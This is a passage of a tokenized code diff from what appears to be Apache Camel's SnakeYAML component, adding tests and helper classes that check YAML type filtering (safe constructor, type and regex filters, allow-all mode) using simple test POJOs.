"distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ";", "import", "org", ".", "apache", ".", "camel", ".", "test", ".", "spring", ".", "CamelSpringTestSupport", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "springframework", ".", "context", ".", "support", ".", "AbstractXmlApplicationContext", ";", "import", "org", ".", "springframework", ".", "context", ".", "support", ".", "ClassPathXmlApplicationContext", ";", "import", "org", ".", "springframework", ".", "test", ".", "annotation", ".", "DirtiesContext", ";", "@", "DirtiesContext", "public", "class", "SnakeYAMLSpringTypeFilterTest", "extends", "CamelSpringTestSupport", "{", "@", "Test", "public", "void", "testSafeConstructor", "(", ")", "throws", "Exception", "{", "SnakeYAMLTypeFilterHelper", ".", "testSafeConstructor", "(", "template", ")", ";", "}", "@", "Test", "public", "void", "testTypeConstructor", "(", ")", "throws", "Exception", "{", "SnakeYAMLTypeFilterHelper", ".", "testTypeConstructor", "(", "template", ")", ";", "}", "@", "Test", "public", "void", "testTypeConstructorFromDefinition", "(", ")", "throws", "Exception", "{", "SnakeYAMLTypeFilterHelper", ".", "testTypeConstructorFromDefinition", "(", "template", ")", ";", "}", "@", "Test", "public", "void", "testAllowAllConstructor", "(", ")", "throws", "Exception", "{", "SnakeYAMLTypeFilterHelper", ".", "testAllowAllConstructor", "(", "template", ")", ";", "}", "@", "Override", "protected", "AbstractXmlApplicationContext", "createApplicationContext", "(", ")", "{", "return", "new", "ClassPathXmlApplicationContext", "(", "\"", "org", "/", "apache", "/", "camel", "/", "component", "/", "snakeyaml", "/", "SnakeYAMLSpringTypeFilterTest", ".", "xml", "\"", ");", "}", "}", "@", "@", "-", "27", ",", "20", "+", "27", ",", "20", "@", "@", "import", "org", ".", "junit", ".", "runners", ".", "Parameterized", ";", "import", "org", ".", "yaml", ".", "snakeyaml", ".", "nodes", ".", "Tag", ";", "import", "static", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLMarshalTestHelper", ".", "createClassTagDataFormat", ";", "import", "static", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLMarshalTestHelper", ".", "createDataFormat", ";", "import", "static", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLMarshalTestHelper", ".", "createPrettyFlowDataFormat", ";", "import", "static", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLMarshalTestHelper", ".", "createTestMap", ";", "import", "static", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLMarshalTestHelper", ".", "createTestPojo", ";", "import", "static", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLTestHelper", ".", "createClassTagDataFormat", ";", "import", "static", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLTestHelper", ".", "createDataFormat", ";", "import", "static", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLTestHelper", ".", "createPrettyFlowDataFormat", ";", "import", "static", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLTestHelper", ".", "createTestMap", ";", "import", "static", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "SnakeYAMLTestHelper", ".", "createTestPojo", ";", "@", "RunWith", "(", "Parameterized", ".", "class", ")", "public", "class", "SnakeYAMLMarshalTest", "extends", "CamelTestSupport", "{", "public", "class", "SnakeYAMLTest", "extends", "CamelTestSupport", "{", "private", "final", "SnakeYAMLDataFormat", "format", ";", "private", "final", "Object", "body", ";", "private", "final", "String", "expected", ";", "public", "SnakeYAMLMarshalTest", "(", "SnakeYAMLDataFormat", "format", ",", "Object", "body", ",", "String", "expected", ")", "{", "public", "SnakeYAMLTest", "(", "SnakeYAMLDataFormat", "format", ",", "Object", "body", ",", "String", "expected", ")", "{", "this", ".", "format", "=", "format", ";", "this", ".", "body", "=", "body", ";", "this", ".", "expected", "=", "expected", ";", "@", "@", "-", "74", ",", "7", "+", "74", ",", "7", "@", "@", "public", "static", "Collection", "yamlCases", "(", ")", "{", "@", "Test", "public", "void", "testMarshalAndUnmarshal", "(", ")", "throws", "Exception", "{", "SnakeYAMLMarshalTestHelper", ".", "marshalAndUnmarshal", "(", "SnakeYAMLTestHelper", ".", "marshalAndUnmarshal", "(", "context", "(", "),", "body", ",", "\"", "mock", ":", "reverse", "\"", ",", "@", "@", "-", "28", ",", "9", "+", "28", ",", "9", "@", "@", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertEquals", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotNull", ";", "public", "final", "class", "SnakeYAMLMarshalTestHelper", "{", "public", "final", "class", "SnakeYAMLTestHelper", "{", "protected", "SnakeYAMLMarshalTestHelper", "(", ")", "{", "protected", "SnakeYAMLTestHelper", "(", ")", "{", "}", "public", "static", "TestPojo", "createTestPojo", "(", ")", "{", "@", "@", "-", "44", ",", "22", "+", "44", ",", "27", "@", "@", "public", "static", "TestPojo", "createTestPojo", "(", ")", "{", "return", "map", ";", "}", "public", "static", "SnakeYAMLDataFormat", "createDataFormat", "(", "Class", "<", "?>", "type", ")", "{", "return", "type", "=", "=", "null", "?", "new", "SnakeYAMLDataFormat", "(", ")", ":", "new", "SnakeYAMLDataFormat", "(", "type", ")", ";", "public", "static", "SnakeYAMLDataFormat", "createDataFormat", "(", "final", "Class", "<", "?>", "type", ")", "{", "SnakeYAMLDataFormat", "format", "=", "new", "SnakeYAMLDataFormat", "(", ");", "if", "(", "type", "!", "=", "null", ")", "{", "format", ".", "setUnmarshalType", "(", "type", ")", ";", "}", "return", "format", ";", "}", "public", "static", "SnakeYAMLDataFormat", "createPrettyFlowDataFormat", "(", "Class", "<", "?>", "type", ",", "boolean", "prettyFlow", ")", "{", "SnakeYAMLDataFormat", "df", "=", "type", "=", "=", "null", "?", "new", "SnakeYAMLDataFormat", "(", ")", ":", "new", "SnakeYAMLDataFormat", "(", "type", ")", ";", "df", ".", "setPrettyFlow", "(", "prettyFlow", ")", ";", "SnakeYAMLDataFormat", "format", "=", "createDataFormat", "(", "type", ")", ";", "format", ".", "setPrettyFlow", "(", "prettyFlow", ")", ";", "return", "df", ";", "return", "format", ";", "}", "public", "static", "SnakeYAMLDataFormat", "createClassTagDataFormat", "(", "Class", "<", "?>", "type", ",", "Tag", "tag", ")", "{", "SnakeYAMLDataFormat", "df", "=", "new", "SnakeYAMLDataFormat", "(", "type", ")", ";", "df", ".", "addTag", "(", "type", ",", "tag", ")", ";", "SnakeYAMLDataFormat", "format", "=", "createDataFormat", "(", "type", ")", ";", "format", ".", "addTag", "(", "type", ",", "tag", ")", ";", "return", "df", ";", "return", "format", ";", "}", "public", "static", "void", "marshalAndUnmarshal", "(", "@", "@", "-", "79", ",", "6", "+", "84", ",", "7", "@", "@", "public", "static", "void", "marshalAndUnmarshal", "(", "template", ".", "sendBody", "(", "directBack", ",", "result", ")", ";", "mock", ".", "assertIsSatisfied", "(", ");", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "117", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ";", "import", "org", ".", "apache", ".", "camel", ".", "CamelExecutionException", ";", "import", "org", ".", "apache", ".", "camel", ".", "ProducerTemplate", ";", "import", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "RexPojo", ";", "import", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "TestPojo", ";", "import", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "UnsafePojo", ";", "import", "org", ".", "yaml", ".", "snakeyaml", ".", "constructor", ".", "ConstructorException", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertNotNull", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "assertTrue", ";", "import", "static", "org", ".", "junit", ".", "Assert", ".", "fail", ";", "public", "final", "class", "SnakeYAMLTypeFilterHelper", "{", "private", "SnakeYAMLTypeFilterHelper", "(", ")", "{", "}", "static", "void", "testSafeConstructor", "(", "ProducerTemplate", "template", ")", "throws", "Exception", "{", "try", "{", "template", ".", "sendBody", "(", "\"", "direct", ":", "safe", "-", "constructor", "\"", ",", "\"", "!!", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "TestPojo", "{", "name", ":", "Camel", "}", "\")", ";", "fail", "(", "\"", "As", "SnakeYAML", "uses", "SafeConstructor", ",", "custom", "types", "should", "not", "be", "allowed", "\"", ");", "}", "catch", "(", "CamelExecutionException", "e", ")", "{", "assertTrue", "(", "e", ".", "getCause", "(", ")", "instanceof", "ConstructorException", ")", ";", "}", "}", "static", "void", "testTypeConstructor", "(", "ProducerTemplate", "template", ")", "throws", "Exception", "{", "Object", "result", "=", "template", ".", "requestBody", "(", "\"", "direct", ":", "type", "-", "constructor", "\"", ",", "\"", "!!", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "TestPojo", "{", "name", ":", "Camel", "}", "\")", ";", "assertNotNull", "(", "result", ")", ";", "assertTrue", "(", "result", "instanceof", "TestPojo", ")", ";", "try", "{", "template", ".", "sendBody", "(", "\"", "direct", ":", "type", "-", "constructor", "\"", ",", "\"", "!!", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "UnsafePojo", "{", "name", ":", "Camel", "}", "\")", ";", "fail", "(", "\"", "As", "SnakeYAML", "filters", "class", "is", "can", "unmarshall", ",", "UnsafePojo", "should", "not", "be", "allowed", "\"", ");", "}", "catch", "(", "CamelExecutionException", "e", ")", "{", "/", "/", "Wrapped", "by", "SnakeYAML", "assertTrue", "(", "e", ".", "getCause", "(", ")", "instanceof", "ConstructorException", ")", ";", "/", "/", "Thrown", "by", "SnakeYAMLDataFormat", "assertTrue", "(", "e", ".", "getCause", "(", ").", "getCause", "(", ")", "instanceof", "IllegalArgumentException", ")", ";", "}", "}", "static", "void", "testTypeConstructorFromDefinition", "(", "ProducerTemplate", "template", ")", "throws", "Exception", "{", "Object", "result", ";", "/", "/", "TestPojo", "-", "->", "from", "definition", "type", ":", "result", "=", "template", ".", "requestBody", "(", "\"", "direct", ":", "type", "-", "constructor", "-", "strdef", "\"", ",", "\"", "!!", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "TestPojo", "{", "name", ":", "Camel", "}", "\")", ";", "assertNotNull", "(", "result", ")", ";", "assertTrue", "(", "result", "instanceof", "TestPojo", ")", ";", "/", "/", "RexPojo", "-", "->", "from", "definition", "rex", ":", "result", "=", "template", ".", "requestBody", "(", "\"", "direct", ":", "type", "-", "constructor", "-", "strdef", "\"", ",", "\"", "!!", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "RexPojo", "{", "name", ":", "Camel", "}", "\")", ";", "assertNotNull", "(", "result", ")", ";", "assertTrue", "(", "result", "instanceof", "RexPojo", ")", ";", "try", "{", "template", ".", "sendBody", "(", "\"", "direct", ":", "type", "-", "constructor", "-", "strdef", "\"", ",", "\"", "!!", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "UnsafePojo", "{", "name", ":", "Camel", "}", "\")", ";", "fail", "(", "\"", "As", "SnakeYAML", "filters", "class", "is", "can", "unmarshall", ",", "UnsafePojo", "should", "not", "be", "allowed", "\"", ");", "}", "catch", "(", "CamelExecutionException", "e", ")", "{", "/", "/", "Wrapped", "by", "SnakeYAML", "assertTrue", "(", "e", ".", "getCause", "(", ")", "instanceof", "ConstructorException", ")", ";", "/", "/", "Thrown", "by", "SnakeYAMLDataFormat", "assertTrue", "(", "e", ".", "getCause", "(", ").", "getCause", "(", ")", "instanceof", "IllegalArgumentException", ")", ";", "}", "}", "static", "void", "testAllowAllConstructor", "(", "ProducerTemplate", "template", ")", "throws", "Exception", "{", "Object", "testPojo", "=", "template", ".", "requestBody", "(", "\"", "direct", ":", "all", "-", "constructor", "\"", ",", "\"", "!!", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "TestPojo", "{", "name", ":", "Camel", "}", "\")", ";", "assertNotNull", "(", "testPojo", ")", ";", "assertTrue", "(", "testPojo", "instanceof", "TestPojo", ")", ";", "Object", "unsafePojo", "=", "template", ".", "requestBody", "(", "\"", "direct", ":", "all", "-", "constructor", "\"", ",", "\"", "!!", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "UnsafePojo", "{", "name", ":", "Camel", "}", "\")", ";", "assertNotNull", "(", "unsafePojo", ")", ";", "assertTrue", "(", "unsafePojo", "instanceof", "UnsafePojo", ")", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "85", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "org", ".", "apache", ".", "camel", ".", "builder", ".", "RouteBuilder", ";", "import", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "TestPojo", ";", "import", "org", ".", "apache", ".", "camel", ".", "test", ".", "junit4", ".", "CamelTestSupport", ";", "import", "org", ".", "junit", ".", "Test", ";", "public", "class", "SnakeYAMLTypeFilterTest", "extends", "CamelTestSupport", "{", "@", "Test", "public", "void", "testSafeConstructor", "(", ")", "throws", "Exception", "{", "SnakeYAMLTypeFilterHelper", ".", "testSafeConstructor", "(", "template", ")", ";", "}", "@", "Test", "public", "void", "testTypeConstructor", "(", ")", "throws", "Exception", "{", "SnakeYAMLTypeFilterHelper", ".", "testTypeConstructor", "(", "template", ")", ";", "}", "@", "Test", "public", "void", "testTypeConstructorFromDefinition", "(", ")", "throws", "Exception", "{", "SnakeYAMLTypeFilterHelper", ".", "testTypeConstructorFromDefinition", "(", "template", ")", ";", "}", "@", "Test", "public", "void", "testAllowAllConstructor", "(", ")", "throws", "Exception", "{", "SnakeYAMLTypeFilterHelper", ".", "testAllowAllConstructor", "(", "template", ")", ";", "}", "@", "Override", "protected", "RouteBuilder", "createRouteBuilder", "(", ")", "throws", "Exception", "{", "return", "new", "RouteBuilder", "(", ")", "{", "@", "Override", "public", "void", "configure", "(", ")", "throws", "Exception", "{", "/", "/", "SafeConstructor", "SnakeYAMLDataFormat", "safeConstructorDf", "=", "new", "SnakeYAMLDataFormat", "(", ");", "from", "(", "\"", "direct", ":", "safe", "-", "constructor", "\"", ")", ".", "unmarshal", "(", "safeConstructorDf", ")", ";", "/", "/", "Type", "filter", "Constructor", "SnakeYAMLDataFormat", "typeConstructorDf", "=", "new", "SnakeYAMLDataFormat", "(", ");", "typeConstructorDf", ".", "addTypeFilters", "(", "TypeFilters", ".", "types", "(", "TestPojo", ".", "class", ")", ");", "from", "(", "\"", "direct", ":", "type", "-", "constructor", "\"", ")", ".", "unmarshal", "(", "typeConstructorDf", ")", ";", "/", "/", "Type", "filter", "Constructor", "from", "string", "definitions", "SnakeYAMLDataFormat", "typeConstructorStrDf", "=", "new", "SnakeYAMLDataFormat", "(", ");", "typeConstructorStrDf", ".", "setTypeFilterDefinitions", "(", "Arrays", ".", "asList", "(", "\"", "type", ":", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "TestPojo", "\"", ",", "\"", "regexp", ":", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "R", ".", "*\"", "))", ";", "from", "(", "\"", "direct", ":", "type", "-", "constructor", "-", "strdef", "\"", ")", ".", "unmarshal", "(", "typeConstructorStrDf", ")", ";", "/", "/", "Allow", "all", "Constructor", "SnakeYAMLDataFormat", "allConstructorDf", "=", "new", "SnakeYAMLDataFormat", "(", ");", "allConstructorDf", ".", "setAllowAnyType", "(", "true", ")", ";", "from", "(", "\"", "direct", ":", "all", "-", "constructor", "\"", ")", ".", "unmarshal", "(", "allConstructorDf", ")", ".", "to", "(", "\"", "mock", ":", "all", "-", "constructor", "\"", ");", "}", "}", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "46", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ";", "import", "org", ".", "apache", ".", "camel", ".", "builder", ".", "RouteBuilder", ";", "import", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ".", "TestPojo", ";", "import", "org", ".", "apache", ".", "camel", ".", "test", ".", "junit4", ".", "CamelTestSupport", ";", "import", "org", ".", "junit", ".", "Test", ";", "public", "class", "SnakeYAMLUnmarshalTypeTest", "extends", "CamelTestSupport", "{", "@", "Test", "public", "void", "testUnmarshal", "(", ")", "throws", "Exception", "{", "Object", "result", "=", "template", ".", "requestBody", "(", "\"", "direct", ":", "unmarshal", "\"", ",", "\"", "name", ":", "Camel", "\"", ");", "assertNotNull", "(", "result", ")", ";", "assertTrue", "(", "result", "instanceof", "TestPojo", ")", ";", "}", "@", "Override", "protected", "RouteBuilder", "createRouteBuilder", "(", ")", "throws", "Exception", "{", "return", "new", "RouteBuilder", "(", ")", "{", "@", "Override", "public", "void", "configure", "(", ")", "throws", "Exception", "{", "SnakeYAMLDataFormat", "format", "=", "new", "SnakeYAMLDataFormat", "(", ");", "format", ".", "setUnmarshalType", "(", "TestPojo", ".", "class", ")", ";", "from", "(", "\"", "direct", ":", "unmarshal", "\"", ")", ".", "unmarshal", "(", "format", ")", ";", "}", "}", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "63", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ";", "public", "class", "RexPojo", "{", "private", "String", "name", ";", "public", "RexPojo", "(", ")", "{", "}", "public", "RexPojo", "(", "String", "name", ")", "{", "this", ".", "name", "=", "name", ";", "}", "public", "String", "getName", "(", ")", "{", "return", "this", ".", "name", ";", "}", "public", "void", "setName", "(", "String", "name", ")", "{", "this", ".", "name", "=", "name", ";", "}", "@", "Override", "public", "boolean", "equals", "(", "Object", "o", ")", "{", "if", "(", "this", "=", "=", "o", ")", "{", "return", "true", ";", "}", "if", "(", "o", "=", "=", "null", "|", "|", "getClass", "(", ")", "!", "=", "o", ".", "getClass", "(", "))", "{", "return", "false", ";", "}", "RexPojo", "pojo", "=", "(", "RexPojo", ")", "o", ";", "return", "name", "!", "=", "null", "?", "name", ".", "equals", "(", "pojo", ".", "name", ")", ":", "pojo", ".", "name", "=", "=", "null", ";", "}", "@", "Override", "public", "int", "hashCode", "(", ")", "{", "return", "name", "!", "=", "null", "?", "name", ".", "hashCode", "(", ")", ":", "0", ";", "}", "@", "Override", "public", "String", "toString", "(", ")", "{", "return", "\"", "RexPojo", "{", "\"", "+", "\"", "name", "=", "'\"", "+", "name", "+", "'", "\\'", "'", "+", "'", "}'", ";", "}", "}", "\\", "No", "newline", "at", "end", "of", "file", "@", "@", "-", "36", ",", "8", "+", "36", ",", "17", "@", "@", "public", "void", "setName", "(", "String", "name", ")", "{", "}", "@", "Override", "public", "boolean", "equals", "(", "Object", "obj", ")", "{", "return", "this", ".", "name", ".", "equals", "(", "((", "TestPojo", ")", "obj", ")", ".", "getName", "(", "))", ";", "public", "boolean", "equals", "(", "Object", "o", ")", "{", "if", "(", "this", "=", "=", "o", ")", "{", "return", "true", ";", "}", "if", "(", "o", "=", "=", "null", "|", "|", "getClass", "(", ")", "!", "=", "o", ".", "getClass", "(", "))", "{", "return", "false", ";", "}", "TestPojo", "pojo", "=", "(", "TestPojo", ")", "o", ";", "return", "name", "!", "=", "null", "?", "name", ".", "equals", "(", "pojo", ".", "name", ")", ":", "pojo", ".", "name", "=", "=", "null", ";", "}", "@", "Override", "@", "@", "-", "47", ",", "6", "+", "56", ",", "8", "@", "@", "public", "int", "hashCode", "(", ")", "{", "@", "Override", "public", "String", "toString", "(", ")", "{", "return", "\"", "TestPojo", "[", "\"", "+", "name", "+", "\"", "]\"", ";", "return", "\"", "TestPojo", "{", "\"", "+", "\"", "name", "=", "'\"", "+", "name", "+", "'", "\\'", "'", "+", "'", "}'", ";", "}", "}", "\\", "No", "newline", "at", "end", "of", "file", "@", "@", "-", "0", ",", "0", "+", "1", ",", "63", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ".", "model", ";", "public", "class", "UnsafePojo", "{", "private", "String", "name", ";", "public", "UnsafePojo", "(", ")", "{", "}", "public", "UnsafePojo", "(", "String", "name", ")", "{", "this", ".", "name", "=", "name", ";", "}", "public", "String", "getName", "(", ")", "{", "return", "this", ".", "name", ";", "}", "public", "void", "setName", "(", "String", "name", ")", "{", "this", ".", "name", "=", "name", ";", "}", "@", "Override", "public", "boolean", "equals", "(", "Object", "o", ")", "{", "if", "(", "this", "=", "=", "o", ")", "{", "return", "true", ";", "}", "if", "(", "o", "=", "=", "null", "|", "|", "getClass", "(", ")", "!", "=", "o", ".", "getClass", "(", "))", "{", "return", "false", ";", "}", "UnsafePojo", "pojo", "=", "(", "UnsafePojo", ")", "o", ";", "return", "name", "!", "=", "null", "?", "name", ".", "equals", "(", "pojo", ".", "name", ")", ":", "pojo", ".", "name", "=", "=", "null", ";", "}", "@", "Override", "public", "int", "hashCode", "(", ")", "{", "return", "name", "!", "=", "null", "?", "name", ".", "hashCode", "(", ")", ":", "0", ";", "}", "@", "Override", "public", "String", "toString", "(", ")", "{", "return", "\"", "UnsafePojo", "{", "\"", "+", "\"", "name", "=", "'\"", "+", "name", "+", "'", "\\'", "'", "+", "'", "}'", ";", "}", "}", "\\", "No", "newline", "at", "end", "of", "file", "@", "@", "-", "0", ",", "0", "+", "1", ",", "71", "@", "@", "<", "?", "xml", "version", "=", "\"", "1", ".", "0", "\"", "encoding", "=", "\"", "UTF", "-", "8", "\"", "?>", "<", "!-", "-", "~", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "~", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "~", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "~", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "~", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "~", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "~", "~", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "~", "~", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "~", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "~", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "~", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "~", "limitations", "under", "the", "License", ".", "-", "->", "<", "blueprint", "xmlns", "=", "\"", "http", ":", "//", "www", ".", "osgi", ".", "org", "/", "xmlns", "/", "blueprint", "/", "v1", ".", "0", ".", "0", "\"", ">", "<", "!-", "-", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "-", "->", "<", "!-", "-", "DataFormat", "-", "->", "<", "!-", "-", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "-", "->", "<", "bean", "id", "=", "\"", "yaml", 